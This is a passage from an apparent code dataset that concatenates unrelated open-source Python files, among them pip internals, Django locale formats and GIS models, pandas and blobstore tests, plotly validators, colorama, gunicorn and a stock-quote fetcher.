            'grant_type': 'authorization_code',
            'code': self.data.get('code', ''),
            'client_id': client_id,
            'client_secret': client_secret,
        }"
JD31	JD31-metadata_legacy.py	"""""""Metadata generation logic for legacy source distributions.
""""""

import logging
import os

from pip._internal.build_env import BuildEnvironment
from pip._internal.exceptions import InstallationError
from pip._internal.utils.setuptools_build import make_setuptools_egg_info_args
from pip._internal.utils.subprocess import call_subprocess
from pip._internal.utils.temp_dir import TempDirectory

logger = logging.getLogger(__name__)


def _find_egg_info(directory):
    # type: (str) -> str
    """"""Find an .egg-info subdirectory in `directory`.
    """"""
    filenames = [
        f for f in os.listdir(directory) if f.endswith("".egg-info"")
    ]

    if not filenames:
        raise InstallationError(
            f""No .egg-info directory found in {directory}""
        )

    if len(filenames) > 1:
        raise InstallationError(
            ""More than one .egg-info directory found in {}"".format(
                directory
            )
        )

    return os.path.join(directory, filenames[0])


def generate_metadata(
    build_env,  # type: BuildEnvironment
    setup_py_path,  # type: str
    source_dir,  # type: str
    isolated,  # type: bool
    details,  # type: str
):
    # type: (...) -> str
    """"""Generate metadata using setup.py-based defacto mechanisms.

    Returns the generated metadata directory.
    """"""
    logger.debug(
        'Running setup.py (path:%s) egg_info for package %s',
        setup_py_path, details,
    )

    egg_info_dir = TempDirectory(
        kind=""pip-egg-info"", globally_managed=True
    ).path

    args = make_setuptools_egg_info_args(
        setup_py_path,
        egg_info_dir=egg_info_dir,
        no_user_config=isolated,
    )

    with build_env:
        call_subprocess(
            args,
            cwd=source_dir,
            command_desc='python setup.py egg_info',
        )

    # Return the .egg-info directory.
    return _find_egg_info(egg_info_dir)"
JD452	JD452-blobstore_test.py	"# Copyright 2015 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import mock
import pytest
import webtest

import blobstore


@pytest.fixture
def app(testbed):
    return webtest.TestApp(blobstore.app)


def test_img(app):
    with mock.patch('blobstore.images') as mock_images:
        with mock.patch('blobstore.blobstore') as mock_blobstore:
            mock_blobstore.get.return_value = b'123'
            mock_images.resize.return_value = 'asdf'
            mock_images.im_feeling_lucky.return_value = 'gsdf'

            response = app.get('/img?blob_key=123')

            assert response.status_int == 200


def test_img_missing(app):
    # Bogus blob_key, should get error
    app.get('/img?blob_key=123', status=404)


def test_no_img_id(app):
    # No blob_key, should get error
    app.get('/img', status=404)


def test_url_redirect(app):
    with mock.patch('blobstore.images') as mock_images:
        with mock.patch('blobstore.blobstore') as mock_blobstore:
            mock_blobstore.get.return_value = b'123'
            mock_images.get_serving_url.return_value = 'http://lh3.ggpht.com/X'

            response = app.get('/redirect?blob_key=123')

            assert response.status_int == 302


def test_url_redirect_missing(app):
    # Bogus blob_key, should get error
    app.get('/redirect?blob_key=123', status=404)


def test_url_redirect_no_key(app):
    # No blob_key, should get error
    app.get('/redirect', status=404)"
JY337	JY337-statistics.py	"from rx.core import Observable
from rx.internal import extensionmethod
import math


def determine_median(sorted_list):
    if len(sorted_list) == 0:
        raise Exception(""The input sequence was empty"")

    if len(sorted_list) % 2 == 1:
        return sorted_list[int((len(sorted_list) + 1) / 2) - 1]
    else:
        median_1 = sorted_list[int((len(sorted_list) + 1) / 2) - 1]
        median_2 = sorted_list[int((len(sorted_list) + 1) / 2)]
        return float(median_1 + median_2) / 2.0


@extensionmethod(Observable)
def median(self):
    """"""
    Calculates the statistical median on numerical emissions. The sequence must be finite.
    """"""
    return self.to_sorted_list().map(lambda l: determine_median(l))


@extensionmethod(Observable)
def mode(self):
    """"""
    Returns the most frequently emitted value (or ""values"" if they have the same number of occurrences).
    The sequence must be finite.
    """"""
    return self.group_by(lambda v: v) \
        .flat_map(lambda grp: grp.count().map(lambda ct: (grp.key, ct))) \
        .to_sorted_list(lambda t: t[1], reverse=True) \
        .flat_map(lambda l: Observable.from_(l).take_while(lambda t: t[1] == l[0][1])) \
        .map(lambda t: t[0])


@extensionmethod(Observable)
def variance(self):
    """"""
    Returns the statistical variance of the numerical emissions.
    The sequence must be finite.
    """"""
    squared_values = self.to_list() \
        .flat_map(lambda l: Observable.from_(l).average().flat_map(lambda avg: Observable.from_(l).map(lambda i: i - avg))) \
        .map(lambda i: i * i) \
        .publish() \
        .auto_connect(2)

    return Observable.zip(squared_values.sum(), squared_values.count(), lambda sum, ct: sum / (ct - 1))


@extensionmethod(Observable)
def standard_deviation(self):
    """"""
    Returns the standard deviation of the numerical emissions:
    The sequence must be finite.
    """"""
    return self.variance().map(lambda i: math.sqrt(i))

"
JY31	JY31-faster_rcnn_x101_32x8d_fpn_mstrain_3x_coco.py	"_base_ = [
    '../common/mstrain_3x_coco.py', '../_base_/models/faster_rcnn_r50_fpn.py'
]
model = dict(
    backbone=dict(
        type='ResNeXt',
        depth=101,
        groups=32,
        base_width=8,
        num_stages=4,
        out_indices=(0, 1, 2, 3),
        frozen_stages=1,
        norm_cfg=dict(type='BN', requires_grad=False),
        style='pytorch',
        init_cfg=dict(
            type='Pretrained',
            checkpoint='open-mmlab://detectron2/resnext101_32x8d')))

# ResNeXt-101-32x8d model trained with Caffe2 at FB,
# so the mean and std need to be changed.
img_norm_cfg = dict(
    mean=[103.530, 116.280, 123.675],
    std=[57.375, 57.120, 58.395],
    to_rgb=False)

# In mstrain 3x config, img_scale=[(1333, 640), (1333, 800)],
# multiscale_mode='range'
train_pipeline = [
    dict(type='LoadImageFromFile'),
    dict(type='LoadAnnotations', with_bbox=True),
    dict(
        type='Resize',
        img_scale=[(1333, 640), (1333, 800)],
        multiscale_mode='range',
        keep_ratio=True),
    dict(type='RandomFlip', flip_ratio=0.5),
    dict(type='Normalize', **img_norm_cfg),
    dict(type='Pad', size_divisor=32),
    dict(type='DefaultFormatBundle'),
    dict(type='Collect', keys=['img', 'gt_bboxes', 'gt_labels']),
]
test_pipeline = [
    dict(type='LoadImageFromFile'),
    dict(
        type='MultiScaleFlipAug',
        img_scale=(1333, 800),
        flip=False,
        transforms=[
            dict(type='Resize', keep_ratio=True),
            dict(type='RandomFlip'),
            dict(type='Normalize', **img_norm_cfg),
            dict(type='Pad', size_divisor=32),
            dict(type='ImageToTensor', keys=['img']),
            dict(type='Collect', keys=['img']),
        ])
]

# Use RepeatDataset to speed up training
data = dict(
    train=dict(dataset=dict(pipeline=train_pipeline)),
    val=dict(pipeline=test_pipeline),
    test=dict(pipeline=test_pipeline))"
JD309	JD309-noxfile_config.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Default TEST_CONFIG_OVERRIDE for python repos.

# You can copy this file into your directory, then it will be imported from
# the noxfile.py.

# The source of truth:
# https://github.com/GoogleCloudPlatform/python-docs-samples/blob/master/noxfile_config.py

TEST_CONFIG_OVERRIDE = {
    # You can opt out from the test for specific Python versions.
    ""ignored_versions"": [""2.7""],
    # Old samples are opted out of enforcing Python type hints
    # All new samples should feature them
    ""enforce_type_hints"": False,
    # An envvar key for determining the project id to use. Change it
    # to 'BUILD_SPECIFIC_GCLOUD_PROJECT' if you want to opt in using a
    # build specific Cloud project. You can also use your own string
    # to use your own Cloud project.
    ""gcloud_project_env"": ""GOOGLE_CLOUD_PROJECT"",
    # 'gcloud_project_env': 'BUILD_SPECIFIC_GCLOUD_PROJECT',
    # If you need to use a specific version of pip,
    # change pip_version_override to the string representation
    # of the version number, for example, ""20.2.4""
    ""pip_version_override"": None,
    # A dictionary you want to inject into your test. Don't put any
    # secrets here. These values will override predefined values.
    ""envs"": {},
}"
JY174	JY174-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = ""d F Y""  # 25 Ottobre 2006
TIME_FORMAT = ""H:i""  # 14:30
DATETIME_FORMAT = ""l d F Y H:i""  # Mercoledì 25 Ottobre 2006 14:30
YEAR_MONTH_FORMAT = ""F Y""  # Ottobre 2006
MONTH_DAY_FORMAT = ""j F""  # 25 Ottobre
SHORT_DATE_FORMAT = ""d/m/Y""  # 25/12/2009
SHORT_DATETIME_FORMAT = ""d/m/Y H:i""  # 25/10/2009 14:30
FIRST_DAY_OF_WEEK = 1  # Lunedì

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    ""%d/%m/%Y"",  # '25/10/2006'
    ""%Y/%m/%d"",  # '2006/10/25'
    ""%d-%m-%Y"",  # '25-10-2006'
    ""%Y-%m-%d"",  # '2006-10-25'
    ""%d-%m-%y"",  # '25-10-06'
    ""%d/%m/%y"",  # '25/10/06'
]
DATETIME_INPUT_FORMATS = [
    ""%d/%m/%Y %H:%M:%S"",  # '25/10/2006 14:30:59'
    ""%d/%m/%Y %H:%M:%S.%f"",  # '25/10/2006 14:30:59.000200'
    ""%d/%m/%Y %H:%M"",  # '25/10/2006 14:30'
    ""%d/%m/%y %H:%M:%S"",  # '25/10/06 14:30:59'
    ""%d/%m/%y %H:%M:%S.%f"",  # '25/10/06 14:30:59.000200'
    ""%d/%m/%y %H:%M"",  # '25/10/06 14:30'
    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'
    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'
    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'
    ""%d-%m-%Y %H:%M:%S"",  # '25-10-2006 14:30:59'
    ""%d-%m-%Y %H:%M:%S.%f"",  # '25-10-2006 14:30:59.000200'
    ""%d-%m-%Y %H:%M"",  # '25-10-2006 14:30'
    ""%d-%m-%y %H:%M:%S"",  # '25-10-06 14:30:59'
    ""%d-%m-%y %H:%M:%S.%f"",  # '25-10-06 14:30:59.000200'
    ""%d-%m-%y %H:%M"",  # '25-10-06 14:30'
]
DECIMAL_SEPARATOR = "",""
THOUSAND_SEPARATOR = "".""
NUMBER_GROUPING = 3"
JD280	JD280-service.py	"# Licensed to the Software Freedom Conservancy (SFC) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The SFC licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

from selenium.webdriver.common import service


class Service(service.Service):

    def __init__(self, executable_path, port=0, verbose=False, log_path=None):
        """"""
        Creates a new instance of the EdgeDriver service.

        EdgeDriver provides an interface for Microsoft WebDriver to use
        with Microsoft Edge.

        :param executable_path: Path to the Microsoft WebDriver binary.
        :param port: Run the remote service on a specified port.
            Defaults to 0, which binds to a random open port of the
            system's choosing.
        :verbose: Whether to make the webdriver more verbose (passes the
            --verbose option to the binary). Defaults to False.
        :param log_path: Optional path for the webdriver binary to log to.
            Defaults to None which disables logging.

        """"""

        self.service_args = []
        if verbose:
            self.service_args.append(""--verbose"")

        params = {
            ""executable"": executable_path,
            ""port"": port,
            ""start_error_message"": ""Please download from http://go.microsoft.com/fwlink/?LinkId=619687""
        }

        if log_path:
            params[""log_file""] = open(log_path, ""a+"")

        service.Service.__init__(self, **params)

    def command_line_args(self):
        return [""--port=%d"" % self.port] + self.service_args"
JD53	JD53-pasterapp.py	"# -*- coding: utf-8 -
#
# This file is part of gunicorn released under the MIT license.
# See the NOTICE for more information.

import configparser
import os

from paste.deploy import loadapp

from gunicorn.app.wsgiapp import WSGIApplication
from gunicorn.config import get_default_config_file


def get_wsgi_app(config_uri, name=None, defaults=None):
    if ':' not in config_uri:
        config_uri = ""config:%s"" % config_uri

    return loadapp(
        config_uri,
        name=name,
        relative_to=os.getcwd(),
        global_conf=defaults,
    )


def has_logging_config(config_file):
    parser = configparser.ConfigParser()
    parser.read([config_file])
    return parser.has_section('loggers')


def serve(app, global_conf, **local_conf):
    """"""\
    A Paste Deployment server runner.

    Example configuration:

        [server:main]
        use = egg:gunicorn#main
        host = 127.0.0.1
        port = 5000
    """"""
    config_file = global_conf['__file__']
    gunicorn_config_file = local_conf.pop('config', None)

    host = local_conf.pop('host', '')
    port = local_conf.pop('port', '')
    if host and port:
        local_conf['bind'] = '%s:%s' % (host, port)
    elif host:
        local_conf['bind'] = host.split(',')

    class PasterServerApplication(WSGIApplication):
        def load_config(self):
            self.cfg.set(""default_proc_name"", config_file)

            if has_logging_config(config_file):
                self.cfg.set(""logconfig"", config_file)

            if gunicorn_config_file:
                self.load_config_from_file(gunicorn_config_file)
            else:
                default_gunicorn_config_file = get_default_config_file()
                if default_gunicorn_config_file is not None:
                    self.load_config_from_file(default_gunicorn_config_file)

            for k, v in local_conf.items():
                if v is not None:
                    self.cfg.set(k.lower(), v)

        def load(self):
            return app

    PasterServerApplication().run()"
JD151	JD151-fetch_close_price.py	"import requests
import re
import json
from urllib.parse import urlencode


def convert_secid(secid: str) -> str:
    if secid[0] == '6' or secid[0] == '5':
        return f'1.{secid}'
    return f'0.{secid}'


def fetch_close_price(secid: str) -> float:
    secid = convert_secid(secid)

    headers = {
        ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0""
    }

    base_url = ""http://push2.eastmoney.com/api/qt/stock/get""

    parameters = (
        (""invt"", 2),
        (""fltt"", 1),
        (""cb"", ""jQuery3510768790004533975_1671331577142""),
        (""fields"", ""f58,f734,f107,f57,f43,f59,f169,f170,f152,f177,f111,f46,f60,f44,f45,f47,f260,f48,f261,f279,f277,f278,f288,f19,f17,f531,f15,f13,f11,f20,f18,f16,f14,f12,f39,f37,f35,f33,f31,f40,f38,f36,f34,f32,f211,f212,f213,f214,f215,f210,f209,f208,f207,f206,f161,f49,f171,f50,f86,f84,f85,f168,f108,f116,f167,f164,f162,f163,f92,f71,f117,f292,f51,f52,f191,f192,f262""),
        (""secid"", secid),
        (""ut"", ""fa5fd1943c7b386f172d6893dbfba10b""),
        (""wbp2u"", ""|0|0|0|web""),
        (""_"", ""1671331577143""),
    )

    url = base_url + '?' + urlencode(parameters)

    resp = requests.get(url, headers=headers)
    if resp.status_code == requests.codes.ok:
        try:
            jq = resp.content.decode('utf-8')
            p = re.compile(""jQuery[0-9_(]+(.*)\);"")
            m = p.match(jq)
            js = json.loads(m.group(1))
            close_price_int = int(js[""data""][""f43""])
            precision = int(js[""data""][""f59""])
            close_price = close_price_int / pow(10, precision)
            return close_price
        except:
            print(f""url = {url}"")
            print(f""resp = {resp.content}"")
    else:
        print(f""url = {url}"")
        print(f""status = {resp.status_code}"")

"
JD28	JD28-__main__.py	"# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See LICENSE in the project root
# for license information.

import sys


if __name__ == ""__main__"":
    # debugpy can also be invoked directly rather than via -m. In this case, the first
    # entry on sys.path is the one added automatically by Python for the directory
    # containing this file. This means that import debugpy will not work, since we need
    # the parent directory of debugpy/ to be in sys.path, rather than debugpy/ itself.
    #
    # The other issue is that many other absolute imports will break, because they
    # will be resolved relative to debugpy/ - e.g. `import debugger` will then try
    # to import debugpy/debugger.py.
    #
    # To fix both, we need to replace the automatically added entry such that it points
    # at parent directory of debugpy/ instead of debugpy/ itself, import debugpy with that
    # in sys.path, and then remove the first entry entry altogether, so that it doesn't
    # affect any further imports we might do. For example, suppose the user did:
    #
    #   python /foo/bar/debugpy ...
    #
    # At the beginning of this script, sys.path will contain ""/foo/bar/debugpy"" as the
    # first entry. What we want is to replace it with ""/foo/bar', then import debugpy
    # with that in effect, and then remove the replaced entry before any more
    # code runs. The imported debugpy module will remain in sys.modules, and thus all
    # future imports of it or its submodules will resolve accordingly.
    if ""debugpy"" not in sys.modules:
        # Do not use dirname() to walk up - this can be a relative path, e.g. ""."".
        sys.path[0] = sys.path[0] + ""/../""
        import debugpy  # noqa

        del sys.path[0]

    from debugpy.server import cli

    cli.main()"
JY553	JY553-test_arithmetic.py	"from datetime import timedelta

import numpy as np
import pytest

from pandas import (
    Interval,
    Timedelta,
    Timestamp,
)


@pytest.mark.parametrize(""method"", [""__add__"", ""__sub__""])
@pytest.mark.parametrize(
    ""interval"",
    [
        Interval(Timestamp(""2017-01-01 00:00:00""), Timestamp(""2018-01-01 00:00:00"")),
        Interval(Timedelta(days=7), Timedelta(days=14)),
    ],
)
@pytest.mark.parametrize(
    ""delta"", [Timedelta(days=7), timedelta(7), np.timedelta64(7, ""D"")]
)
def test_time_interval_add_subtract_timedelta(interval, delta, method):
    # https://github.com/pandas-dev/pandas/issues/32023
    result = getattr(interval, method)(delta)
    left = getattr(interval.left, method)(delta)
    right = getattr(interval.right, method)(delta)
    expected = Interval(left, right)

    assert result == expected


@pytest.mark.parametrize(""interval"", [Interval(1, 2), Interval(1.0, 2.0)])
@pytest.mark.parametrize(
    ""delta"", [Timedelta(days=7), timedelta(7), np.timedelta64(7, ""D"")]
)
def test_numeric_interval_add_timedelta_raises(interval, delta):
    # https://github.com/pandas-dev/pandas/issues/32023
    msg = ""|"".join(
        [
            ""unsupported operand"",
            ""cannot use operands"",
            ""Only numeric, Timestamp and Timedelta endpoints are allowed"",
        ]
    )
    with pytest.raises((TypeError, ValueError), match=msg):
        interval + delta

    with pytest.raises((TypeError, ValueError), match=msg):
        delta + interval


@pytest.mark.parametrize(""klass"", [timedelta, np.timedelta64, Timedelta])
def test_timedelta_add_timestamp_interval(klass):
    delta = klass(0)
    expected = Interval(Timestamp(""2020-01-01""), Timestamp(""2020-02-01""))

    result = delta + expected
    assert result == expected

    result = expected + delta
    assert result == expected"
JD47	JD47-cache.py	"""""""HTTP cache implementation.
""""""

import os
from contextlib import contextmanager
from typing import Generator, Optional

from pip._vendor.cachecontrol.cache import BaseCache
from pip._vendor.cachecontrol.caches import FileCache
from pip._vendor.requests.models import Response

from pip._internal.utils.filesystem import adjacent_tmp_file, replace
from pip._internal.utils.misc import ensure_dir


def is_from_cache(response: Response) -> bool:
    return getattr(response, ""from_cache"", False)


@contextmanager
def suppressed_cache_errors() -> Generator[None, None, None]:
    """"""If we can't access the cache then we can just skip caching and process
    requests as if caching wasn't enabled.
    """"""
    try:
        yield
    except OSError:
        pass


class SafeFileCache(BaseCache):
    """"""
    A file based cache which is safe to use even when the target directory may
    not be accessible or writable.
    """"""

    def __init__(self, directory: str) -> None:
        assert directory is not None, ""Cache directory must not be None.""
        super().__init__()
        self.directory = directory

    def _get_cache_path(self, name: str) -> str:
        # From cachecontrol.caches.file_cache.FileCache._fn, brought into our
        # class for backwards-compatibility and to avoid using a non-public
        # method.
        hashed = FileCache.encode(name)
        parts = list(hashed[:5]) + [hashed]
        return os.path.join(self.directory, *parts)

    def get(self, key: str) -> Optional[bytes]:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            with open(path, ""rb"") as f:
                return f.read()

    def set(self, key: str, value: bytes, expires: Optional[int] = None) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            ensure_dir(os.path.dirname(path))

            with adjacent_tmp_file(path) as f:
                f.write(value)

            replace(f.name, path)

    def delete(self, key: str) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            os.remove(path)"
JD269	JD269-models.py	"""""""
 The GeometryColumns and SpatialRefSys models for the Oracle spatial
 backend.

 It should be noted that Oracle Spatial does not have database tables
 named according to the OGC standard, so the closest analogs are used.
 For example, the `USER_SDO_GEOM_METADATA` is used for the GeometryColumns
 model and the `SDO_COORD_REF_SYS` is used for the SpatialRefSys model.
""""""
from django.contrib.gis.db import models
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin


class OracleGeometryColumns(models.Model):
    ""Maps to the Oracle USER_SDO_GEOM_METADATA table.""
    table_name = models.CharField(max_length=32)
    column_name = models.CharField(max_length=1024)
    srid = models.IntegerField(primary_key=True)
    # TODO: Add support for `diminfo` column (type MDSYS.SDO_DIM_ARRAY).

    class Meta:
        app_label = ""gis""
        db_table = ""USER_SDO_GEOM_METADATA""
        managed = False

    def __str__(self):
        return ""%s - %s (SRID: %s)"" % (self.table_name, self.column_name, self.srid)

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return ""table_name""

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return ""column_name""


class OracleSpatialRefSys(models.Model, SpatialRefSysMixin):
    ""Maps to the Oracle MDSYS.CS_SRS table.""
    cs_name = models.CharField(max_length=68)
    srid = models.IntegerField(primary_key=True)
    auth_srid = models.IntegerField()
    auth_name = models.CharField(max_length=256)
    wktext = models.CharField(max_length=2046)
    # Optional geometry representing the bounds of this coordinate
    # system.  By default, all are NULL in the table.
    cs_bounds = models.PolygonField(null=True)

    class Meta:
        app_label = ""gis""
        db_table = ""CS_SRS""
        managed = False

    @property
    def wkt(self):
        return self.wktext"
JY410	JY410-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""box"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY216	JY216-set_fake_passwords.py	"# -*- coding: utf-8 -*-
""""""
set_fake_passwords.py

    Reset all user passwords to a common value. Useful for testing in a
    development environment. As such, this command is only available when
    setting.DEBUG is True.

""""""
from typing import List

from django.conf import settings
from django.contrib.auth import get_user_model
from django.core.management.base import BaseCommand, CommandError

from django_extensions.management.utils import signalcommand

DEFAULT_FAKE_PASSWORD = 'password'


class Command(BaseCommand):
    help = 'DEBUG only: sets all user passwords to a common value (""%s"" by default)' % (DEFAULT_FAKE_PASSWORD, )
    requires_system_checks: List[str] = []

    def add_arguments(self, parser):
        super().add_arguments(parser)
        parser.add_argument(
            '--prompt', dest='prompt_passwd', default=False,
            action='store_true',
            help='Prompts for the new password to apply to all users'
        )
        parser.add_argument(
            '--password', dest='default_passwd', default=DEFAULT_FAKE_PASSWORD,
            help='Use this as default password.'
        )

    @signalcommand
    def handle(self, *args, **options):
        if not settings.DEBUG:
            raise CommandError('Only available in debug mode')

        if options['prompt_passwd']:
            from getpass import getpass
            passwd = getpass('Password: ')
            if not passwd:
                raise CommandError('You must enter a valid password')
        else:
            passwd = options['default_passwd']

        User = get_user_model()
        user = User()
        user.set_password(passwd)
        count = User.objects.all().update(password=user.password)

        print('Reset %d passwords' % count)"
JD341	JD341-ngpvan.py	"""""""
NGP VAN's `ActionID` Provider

http://developers.ngpvan.com/action-id
""""""
from openid.extensions import ax

from .open_id import OpenIdAuth


class ActionIDOpenID(OpenIdAuth):
    """"""
    NGP VAN's ActionID OpenID 1.1 authentication backend
    """"""
    name = 'actionid-openid'
    URL = 'https://accounts.ngpvan.com/Home/Xrds'
    USERNAME_KEY = 'email'

    def get_ax_attributes(self):
        """"""
        Return the AX attributes that ActionID responds with, as well as the
        user data result that it must map to.
        """"""
        return [
            ('http://openid.net/schema/contact/internet/email', 'email'),
            ('http://openid.net/schema/contact/phone/business', 'phone'),
            ('http://openid.net/schema/namePerson/first', 'first_name'),
            ('http://openid.net/schema/namePerson/last', 'last_name'),
            ('http://openid.net/schema/namePerson', 'fullname'),
        ]

    def setup_request(self, params=None):
        """"""
        Setup the OpenID request

        Because ActionID does not advertise the availiability of AX attributes
        nor use standard attribute aliases, we need to setup the attributes
        manually instead of rely on the parent OpenIdAuth.setup_request()
        """"""
        request = self.openid_request(params)

        fetch_request = ax.FetchRequest()
        fetch_request.add(ax.AttrInfo(
            'http://openid.net/schema/contact/internet/email',
            alias='ngpvanemail',
            required=True
        ))

        fetch_request.add(ax.AttrInfo(
            'http://openid.net/schema/contact/phone/business',
            alias='ngpvanphone',
            required=False
        ))
        fetch_request.add(ax.AttrInfo(
            'http://openid.net/schema/namePerson/first',
            alias='ngpvanfirstname',
            required=False
        ))
        fetch_request.add(ax.AttrInfo(
            'http://openid.net/schema/namePerson/last',
            alias='ngpvanlastname',
            required=False
        ))
        request.addExtension(fetch_request)

        return request"
JY535	JY535-__init__.py	"import sys
from typing import TYPE_CHECKING

if sys.version_info < (3, 7) or TYPE_CHECKING:
    from ._symbolsrc import SymbolsrcValidator
    from ._symbol import SymbolValidator
    from ._sizesrc import SizesrcValidator
    from ._sizeref import SizerefValidator
    from ._sizemode import SizemodeValidator
    from ._sizemin import SizeminValidator
    from ._size import SizeValidator
    from ._showscale import ShowscaleValidator
    from ._reversescale import ReversescaleValidator
    from ._opacity import OpacityValidator
    from ._line import LineValidator
    from ._colorsrc import ColorsrcValidator
    from ._colorscale import ColorscaleValidator
    from ._colorbar import ColorbarValidator
    from ._coloraxis import ColoraxisValidator
    from ._color import ColorValidator
    from ._cmin import CminValidator
    from ._cmid import CmidValidator
    from ._cmax import CmaxValidator
    from ._cauto import CautoValidator
    from ._autocolorscale import AutocolorscaleValidator
else:
    from _plotly_utils.importers import relative_import

    __all__, __getattr__, __dir__ = relative_import(
        __name__,
        [],
        [
            ""._symbolsrc.SymbolsrcValidator"",
            ""._symbol.SymbolValidator"",
            ""._sizesrc.SizesrcValidator"",
            ""._sizeref.SizerefValidator"",
            ""._sizemode.SizemodeValidator"",
            ""._sizemin.SizeminValidator"",
            ""._size.SizeValidator"",
            ""._showscale.ShowscaleValidator"",
            ""._reversescale.ReversescaleValidator"",
            ""._opacity.OpacityValidator"",
            ""._line.LineValidator"",
            ""._colorsrc.ColorsrcValidator"",
            ""._colorscale.ColorscaleValidator"",
            ""._colorbar.ColorbarValidator"",
            ""._coloraxis.ColoraxisValidator"",
            ""._color.ColorValidator"",
            ""._cmin.CminValidator"",
            ""._cmid.CmidValidator"",
            ""._cmax.CmaxValidator"",
            ""._cauto.CautoValidator"",
            ""._autocolorscale.AutocolorscaleValidator"",
        ],
    )"
JY155	JY155-initialise.py	"# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
import atexit
import contextlib
import sys

from .ansitowin32 import AnsiToWin32


orig_stdout = None
orig_stderr = None

wrapped_stdout = None
wrapped_stderr = None

atexit_done = False


def reset_all():
    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit
        AnsiToWin32(orig_stdout).reset_all()


def init(autoreset=False, convert=None, strip=None, wrap=True):

    if not wrap and any([autoreset, convert, strip]):
        raise ValueError('wrap=False conflicts with any other arg=True')

    global wrapped_stdout, wrapped_stderr
    global orig_stdout, orig_stderr

    orig_stdout = sys.stdout
    orig_stderr = sys.stderr

    if sys.stdout is None:
        wrapped_stdout = None
    else:
        sys.stdout = wrapped_stdout = \
            wrap_stream(orig_stdout, convert, strip, autoreset, wrap)
    if sys.stderr is None:
        wrapped_stderr = None
    else:
        sys.stderr = wrapped_stderr = \
            wrap_stream(orig_stderr, convert, strip, autoreset, wrap)

    global atexit_done
    if not atexit_done:
        atexit.register(reset_all)
        atexit_done = True


def deinit():
    if orig_stdout is not None:
        sys.stdout = orig_stdout
    if orig_stderr is not None:
        sys.stderr = orig_stderr


@contextlib.contextmanager
def colorama_text(*args, **kwargs):
    init(*args, **kwargs)
    try:
        yield
    finally:
        deinit()


def reinit():
    if wrapped_stdout is not None:
        sys.stdout = wrapped_stdout
    if wrapped_stderr is not None:
        sys.stderr = wrapped_stderr


def wrap_stream(stream, convert, strip, autoreset, wrap):
    if wrap:
        wrapper = AnsiToWin32(stream,
            convert=convert, strip=strip, autoreset=autoreset)
        if wrapper.should_wrap():
            stream = wrapper.stream
    return stream"
JD465	JD465-dockerhelpers.py	"#
# Copyright 2017 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

""""""
